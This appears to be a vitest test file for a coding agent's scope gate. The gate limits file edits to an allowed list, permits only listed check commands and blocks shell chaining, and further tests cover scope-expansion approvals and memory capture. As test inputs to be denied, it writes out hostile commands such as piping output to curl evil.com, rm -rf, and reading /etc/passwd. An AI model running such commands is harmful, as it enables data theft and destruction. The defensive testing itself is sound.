// P56: ScopeContract enforcement tests

import { describe, it, expect, beforeEach } from "vitest";
import { scopeGate } from "../src/gates/scope-gate.js";
import type { GateContext, GateToolCall } from "../src/gates/types.js";

function makeCtx(overrides: Partial<GateContext> = {}): GateContext {
  return {
    directive: null,
    mode: "memory",
    projectRoot: "/tmp/test-project",
    probeCompleted: false,
    verifierVerdict: null,
    revisionCount: 0,
    maxRevisions: 3,
    needProbe: null,
    problemText: "fix bug",
    targetFiles: [],
    ...overrides,
  };
}

function writeCall(filePath: string): GateToolCall {
  return { name: "write", args: { file_path: filePath } };
}

function editCall(filePath: string): GateToolCall {
  return { name: "edit", args: { file_path: filePath } };
}

function readCall(filePath: string): GateToolCall {
  return { name: "read", args: { file_path: filePath } };
}

function bashCall(command: string): GateToolCall {
  return { name: "bash", args: { command } };
}

describe("Scope Gate — ScopeContract enforcement", () => {
  it("allows write to file in editableScope", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: ["test/foo.test.ts"],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, writeCall("src/foo.ts"));
    expect(result.decision).toBe("allow");
  });

  it("denies write to file NOT in editableScope", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: ["test/foo.test.ts"],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, writeCall("src/bar.ts"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("not in editable scope");
  });

  it("denies edit to file NOT in editableScope", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, editCall("src/bar.ts"));
    expect(result.decision).toBe("deny");
  });

  it("allows read of any file (read is not scope-gated)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, readCall("test/secret.test.ts"));
    expect(result.decision).toBe("allow");
  });

  it("allows bash that matches successCheck", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test", "npm run lint"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test"));
    expect(result.decision).toBe("allow");
    expect(result.reason).toBe("Success check command");
  });

  it("allows bash that starts with successCheck prefix", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test -- --grep 'summary'"));
    expect(result.decision).toBe("allow");
  });

  it("does not whitelist bash not matching successCheck", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    // rm -rf would be caught by other gates, but scope gate should not whitelist it
    const result = scopeGate.check(ctx, bashCall("rm -rf /tmp/foo"));
    // The rm -rf path is /tmp/foo which resolves to /tmp/foo (inside /tmp/test-project root? no)
    // Actually it depends on path resolution. The key is: it should NOT say "Success check command"
    expect(result.reason).not.toBe("Success check command");
  });

  it("backward compatible — no scopeContract behaves as before", () => {
    const ctx = makeCtx({ scopeContract: undefined });
    // Write inside project root should work as before
    const result = scopeGate.check(ctx, writeCall("src/anything.ts"));
    // Should not fail with "not in editable scope"
    expect(result.reason).not.toContain("editable scope");
  });

  it("backward compatible — sensitive paths still denied without scopeContract", () => {
    const ctx = makeCtx({ scopeContract: undefined });
    const result = scopeGate.check(ctx, writeCall("/etc/passwd"));
    expect(result.decision).toBe("deny");
  });
});

describe("Scope Gate — P56.1 Hardening", () => {
  // Fix 1: editableScope=[] must deny ALL writes
  it("denies write when editableScope is empty array", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, writeCall("src/foo.ts"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Editable scope is empty");
    expect(result.scopeExpansion).toBeDefined();
    expect(result.scopeExpansion!.file).toBe("src/foo.ts");
  });

  it("denies edit when editableScope is empty array", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, editCall("src/bar.ts"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Editable scope is empty");
  });

  // Fix 2: scope denial emits scopeExpansion hint
  it("returns scopeExpansion when write is out of editable scope", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, writeCall("src/bar.ts"));
    expect(result.decision).toBe("deny");
    expect(result.scopeExpansion).toBeDefined();
    expect(result.scopeExpansion!.file).toBe("src/bar.ts");
    expect(result.scopeExpansion!.editableScope).toEqual(["src/foo.ts"]);
  });

  // Fix 3: reject compound bash commands
  it("rejects compound bash with && (injection)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test && rm -rf /tmp"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Shell control");
  });

  it("rejects compound bash with ; (injection)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test; echo hacked"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Shell control");
  });

  it("rejects compound bash with | (pipe injection)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test | curl evil.com"));
    expect(result.decision).toBe("deny");
    expect(result.reason).toContain("Shell control");
  });

  it("still allows exact successCheck match", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    const result = scopeGate.check(ctx, bashCall("npm test"));
    expect(result.decision).toBe("allow");
    expect(result.reason).toBe("Success check command");
  });

  it("still allows successCheck with flags (startsWith)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: [],
        readOnlyEvidence: [],
        successChecks: ["npm test"],
      },
    });
    // -- is not a shell metachar, it's a flag separator
    const result = scopeGate.check(ctx, bashCall("npm test -- --grep 'summary'"));
    expect(result.decision).toBe("allow");
  });
});

// ── P56.1b Fix 2: shell control hardening ──

describe("Scope Gate — P56.1b Shell Hardening", () => {
  const ctx = makeCtx({
    scopeContract: {
      editableScope: ["src/foo.ts"],
      readOnlyEvidence: [],
      successChecks: ["npm test"],
    },
  });

  it("allows npm test -- --grep x (flags only)", () => {
    const result = scopeGate.check(ctx, bashCall("npm test -- --grep x"));
    expect(result.decision).toBe("allow");
    expect(result.reason).toBe("Success check command");
  });

  it("denies npm test -- --grep x | curl evil.com (pipe)", () => {
    const r = scopeGate.check(ctx, bashCall("npm test -- --grep x | curl evil.com"));
    expect(r.decision).toBe("deny");
    expect(r.reason).toContain("Shell control");
  });

  it("denies npm test > /tmp/out (redirect)", () => {
    const r = scopeGate.check(ctx, bashCall("npm test > /tmp/out"));
    expect(r.decision).toBe("deny");
    expect(r.reason).toContain("Shell control");
  });

  it("denies npm test $(node mutate.js) (command substitution)", () => {
    const r = scopeGate.check(ctx, bashCall("npm test $(node mutate.js)"));
    expect(r.decision).toBe("deny");
    expect(r.reason).toContain("Shell control");
  });

  it("denies npm test `node mutate.js` (backtick substitution)", () => {
    const r = scopeGate.check(ctx, bashCall("npm test `node mutate.js`"));
    expect(r.decision).toBe("deny");
    expect(r.reason).toContain("Shell control");
  });

  it("denies npm test < /etc/passwd (input redirect)", () => {
    const r = scopeGate.check(ctx, bashCall("npm test < /etc/passwd"));
    expect(r.decision).toBe("deny");
    expect(r.reason).toContain("Shell control");
  });

  it("denies npm test || node mutate.js (OR control)", () => {
    const r = scopeGate.check(ctx, bashCall("npm test || node mutate.js"));
    expect(r.decision).toBe("deny");
    expect(r.reason).toContain("Shell control");
  });

  it("denies npm test && echo done (AND control)", () => {
    const r = scopeGate.check(ctx, bashCall("npm test && echo done"));
    expect(r.decision).toBe("deny");
    expect(r.reason).toContain("Shell control");
  });

  it("denies npm test; echo done (semicolon)", () => {
    const r = scopeGate.check(ctx, bashCall("npm test; echo done"));
    expect(r.decision).toBe("deny");
    expect(r.reason).toContain("Shell control");
  });
});


// ── P56.2 Scope Expansion Runtime ──

import type { ScopeContract } from "../src/types.js";

describe("Scope Contract — P56.2 Runtime Expansion Logic", () => {
  // Test that scopeGate.check() respects runtime-expanded scope
  // by manually simulating: expand scope → re-check

  it("after expansion, previously blocked file is now allowed", () => {
    // First check: file outside scope → denied
    const ctx1 = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result1 = scopeGate.check(ctx1, writeCall("src/bar.ts"));
    expect(result1.decision).toBe("deny");
    expect(result1.scopeExpansion).toBeDefined();

    // Simulate expansion: add file to scope
    const ctx2 = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts", "src/bar.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result2 = scopeGate.check(ctx2, writeCall("src/bar.ts"));
    expect(result2.decision).toBe("allow");
  });

  it("expansion only affects the approved file", () => {
    // Expand scope to include bar.ts but NOT baz.ts
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts", "src/bar.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    // bar.ts now allowed
    expect(scopeGate.check(ctx, writeCall("src/bar.ts")).decision).toBe("allow");
    // baz.ts still denied
    const bazResult = scopeGate.check(ctx, writeCall("src/baz.ts"));
    expect(bazResult.decision).toBe("deny");
    expect(bazResult.scopeExpansion).toBeDefined();
  });

  it("callback-type signature matches expected shape", () => {
    // Compile-time verification: the callback type exists
    const cb: (request: {
      file: string;
      reason: string;
      editableScope: string[];
    }) => Promise<"approve" | "reject"> = async (_req) => "approve";
    expect(typeof cb).toBe("function");
  });

  it("no callback → deny preserved (gate still returns scopeExpansion)", () => {
    const ctx = makeCtx({
      scopeContract: {
        editableScope: ["src/foo.ts"],
        readOnlyEvidence: [],
        successChecks: [],
      },
    });
    const result = scopeGate.check(ctx, writeCall("src/bar.ts"));
    expect(result.decision).toBe("deny");
    // scopeExpansion is always present on scope violations (even without callback)
    expect(result.scopeExpansion).toBeDefined();
    expect(result.scopeExpansion!.file).toBe("src/bar.ts");
  });
});

// ── P56.3c Integration: scope expansion through runAgentLoop ──

import { runAgentLoop } from "../src/loop/agent-loop.js";
import type { EngineEvent, ScopeContract } from "../src/types.js";

const PEAN_DIRECTIVE = `## Product Intent
Fix the bug in the source code so that all tests pass correctly now.

## Hidden Semantics
The fix must handle edge cases properly and preserve existing behavior here.

## Acceptance Tests
Run npm test and verify all test cases pass with the corrected source code.

## Implementation Constraints
Only modify the source file, do not change any test files or config at all.

## Red Flags
Do not modify test files, config files, or any package configuration file.

## Coding Worker Directive
Read the test file first to understand expectations, then fix the source code.`;

function makeIntProvider(sequence: Array<"directive" | { tool: string; args: Record<string, unknown> } | "stop" | "review_pass">) {
  let idx = 0;
  const u = () => ({ prompt_tokens: 10, completion_tokens: 5, total_tokens: 15, cache_hit_ratio: 0, prompt_cache_hit_tokens: 0, prompt_cache_miss_tokens: 10 });
  return {
    async call(_params: any): Promise<any> {
      if (idx >= sequence.length) {
        return { message: { role: "assistant" as const, content: JSON.stringify({ verdict: "PASS", issues: [] }) }, finish_reason: "stop" as const, usage: u() };
      }
      const action = sequence[idx++]!;
      if (action === "directive") {
        return { message: { role: "assistant" as const, content: PEAN_DIRECTIVE }, finish_reason: "stop" as const, usage: u() };
      }
      if (action === "stop") {
        return { message: { role: "assistant" as const, content: "Done" }, finish_reason: "stop" as const, usage: u() };
      }
      if (action === "review_pass") {
        return { message: { role: "assistant" as const, content: JSON.stringify({ verdict: "PASS", issues: [] }) }, finish_reason: "stop" as const, usage: u() };
      }
      return { message: { role: "assistant" as const, tool_calls: [{ id: `c${idx}`, type: "function" as const, function: { name: action.tool, arguments: JSON.stringify(action.args) } }] }, finish_reason: "tool_calls" as const, usage: u() };
    },
  };
}

function makeIntTools() {
  const executed: Array<{ name: string; args: Record<string, unknown> }> = [];
  return {
    executed,
    tools: {
      definitions: [{ type: "function" as const, function: { name: "edit", description: "E", parameters: { type: "object", properties: { file_path: { type: "string" }, old_string: { type: "string" }, new_string: { type: "string" } }, required: ["file_path", "old_string", "new_string"] } } }],
      async execute(call: any): Promise<any> { const a = JSON.parse(call.function.arguments); executed.push({ name: call.function.name, args: a }); return { tool_call_id: call.id, content: "ok" }; },
    },
  };
}

describe("Scope Contract — P56.3c agent-loop integration", () => {
  it("approve: expansion works end-to-end", async () => {
    const events: EngineEvent[] = [];
    const { executed, tools } = makeIntTools();
    let expandCalls = 0;

    // Sequence: directive → edit(outside) → edit(retry after expansion) → stop
    const provider = makeIntProvider([
      "directive",
      { tool: "edit", args: { file_path: "src/bar.ts", old_string: "x", new_string: "y" } },
      { tool: "edit", args: { file_path: "src/bar.ts", old_string: "x", new_string: "y" } },
      "stop",
    ]);

    const summary = await runAgentLoop({
      provider: provider as any, tools: tools as any,
      mode: "memory", problem: "fix bug in src/foo.ts", taskId: "int-approve",
      maxToolRounds: 8, approvalMode: "auto",
      scopeContract: { editableScope: ["src/foo.ts"], readOnlyEvidence: [], successChecks: [] },
      onEvent: (e) => { events.push(e); },
      onScopeExpansionRequired: async (_req) => { expandCalls++; return "approve"; },
    });

    // scope_expansion_required was emitted
    const expEvts = events.filter((e) => e.type === "scope_expansion_required");
    expect(expEvts.length).toBe(1);

    // Callback was called
    expect(expandCalls).toBe(1);

    // Tool was executed (second attempt after expansion)
    const barEdits = executed.filter((e) => e.args.file_path === "src/bar.ts");
    expect(barEdits.length).toBe(1);

    // Summary evidence
    expect(summary.scopeExpansionRequests).toBe(1);
    expect(summary.expandedScope).toContain("src/bar.ts");
    expect(summary.filesChanged).toContain("src/bar.ts");
    expect(summary.scopeRespected).toBe(true);
  });

  it("reject: expansion denied — file not written", async () => {
    const events: EngineEvent[] = [];
    const { executed, tools } = makeIntTools();
    let expandCalls = 0;

    // Sequence: directive → edit(outside, rejected) → stop
    const provider = makeIntProvider([
      "directive",
      { tool: "edit", args: { file_path: "src/bar.ts", old_string: "x", new_string: "y" } },
      "stop",
    ]);

    const summary = await runAgentLoop({
      provider: provider as any, tools: tools as any,
      mode: "memory", problem: "fix bug in src/foo.ts", taskId: "int-reject",
      maxToolRounds: 6, approvalMode: "auto",
      scopeContract: { editableScope: ["src/foo.ts"], readOnlyEvidence: [], successChecks: [] },
      onEvent: (e) => { events.push(e); },
      onScopeExpansionRequired: async (_req) => { expandCalls++; return "reject"; },
    });

    // scope_expansion_required was emitted
    const expEvts = events.filter((e) => e.type === "scope_expansion_required");
    expect(expEvts.length).toBe(1);

    // Callback was called
    expect(expandCalls).toBe(1);

    // Tool was NOT executed for the rejected file
    const barEdits = executed.filter((e) => e.args.file_path === "src/bar.ts");
    expect(barEdits.length).toBe(0);

    // Summary evidence
    expect(summary.scopeExpansionRequests).toBe(1);
    expect(summary.expandedScope).not.toContain("src/bar.ts");
    expect(summary.filesChanged).not.toContain("src/bar.ts");
  });
});

// ── P58 Memory Capture ──

import { runAgentLoop } from "../src/loop/agent-loop.js";
import { SandboxStore } from "../src/memory/store.js";
import type { EngineEvent } from "../src/types.js";
import { rmSync } from "node:fs";

const PEAN_DIR = `## Product Intent
Fix the bug in the source code so that all tests pass correctly now.

## Hidden Semantics
The fix must handle edge cases properly and preserve existing behavior here.

## Acceptance Tests
Run npm test and verify all test cases pass with the corrected source code.

## Implementation Constraints
Only modify the source file, do not change any test files or config at all.

## Red Flags
Do not modify test files, config files, or any package configuration file.

## Coding Worker Directive
Read the test file first to understand expectations, then fix the source code.`;

function makeMemProvider() {
  let calls = 0;
  const u = () => ({ prompt_tokens: 10, completion_tokens: 5, total_tokens: 15, cache_hit_ratio: 0, prompt_cache_hit_tokens: 0, prompt_cache_miss_tokens: 10 });
  return {
    async call(_params: any): Promise<any> {
      calls++;
      if (calls === 1) return { message: { role: "assistant" as const, content: PEAN_DIR }, finish_reason: "stop" as const, usage: u() };
      if (calls === 2) return { message: { role: "assistant" as const, tool_calls: [{ id: "c1", type: "function" as const, function: { name: "edit", arguments: JSON.stringify({ file_path: "src/foo.ts", old_string: "x", new_string: "y" }) } }] }, finish_reason: "tool_calls" as const, usage: u() };
      if (calls === 3) return { message: { role: "assistant" as const, content: "Fixed" }, finish_reason: "stop" as const, usage: u() };
      return { message: { role: "assistant" as const, content: JSON.stringify({ verdict: "PASS", issues: [] }) }, finish_reason: "stop" as const, usage: u() };
    },
  };
}

describe("Memory Capture — P58 engine-to-sandbox", () => {
  const DB = "/tmp/kevix-capture-test.json";

  beforeEach(() => { try { rmSync(DB, { force: true }); } catch {} });

  it("writes RawMemoryRecord after task completion", async () => {
    const store = new SandboxStore(DB);
    const events: EngineEvent[] = [];

    await runAgentLoop({
      provider: makeMemProvider() as any,
      tools: {
        definitions: [{ type: "function" as const, function: { name: "edit", description: "E", parameters: { type: "object", properties: { file_path: { type: "string" }, old_string: { type: "string" }, new_string: { type: "string" } }, required: ["file_path", "old_string", "new_string"] } } }],
        async execute(call: any): Promise<any> { return { tool_call_id: call.id, content: "ok" }; },
      },
      mode: "memory", problem: "fix bug in src/foo.ts", taskId: "cap-test",
      maxToolRounds: 5, approvalMode: "auto",
      scopeContract: { editableScope: ["src/foo.ts"], readOnlyEvidence: [], successChecks: [] },
      onEvent: (e) => { events.push(e); },
      memoryStore: store,
    });

    expect(store.recordCount()).toBe(1);
    const r = store.allRecords()[0]!;
    expect(r.taskId).toBe("cap-test");
    expect(r.mode).toBe("memory");
    expect(r.problem).toContain("fix bug");
    expect(r.phases).toContain("worker");
    expect(r.scopeContract?.editableScope).toEqual(["src/foo.ts"]);
    expect(r.tags).toContain("bugfix");
    expect(r.outcome.escalated).toBe(false);
    // expiresAt auto-set
    expect(r.expiresAt).toBeTruthy();
    expect(new Date(r.expiresAt).getTime()).toBeGreaterThan(Date.now());
  });

  it("no memoryStore → no crash, normal summary", async () => {
    const summary = await runAgentLoop({
      provider: makeMemProvider() as any,
      tools: {
        definitions: [{ type: "function" as const, function: { name: "edit", description: "E", parameters: { type: "object", properties: { file_path: { type: "string" }, old_string: { type: "string" }, new_string: { type: "string" } }, required: ["file_path", "old_string", "new_string"] } } }],
        async execute(call: any): Promise<any> { return { tool_call_id: call.id, content: "ok" }; },
      },
      mode: "memory", problem: "fix bug", taskId: "no-store",
      maxToolRounds: 5, approvalMode: "auto",
      // no memoryStore
    });

    expect(summary.task_id).toBe("no-store");
  });
});
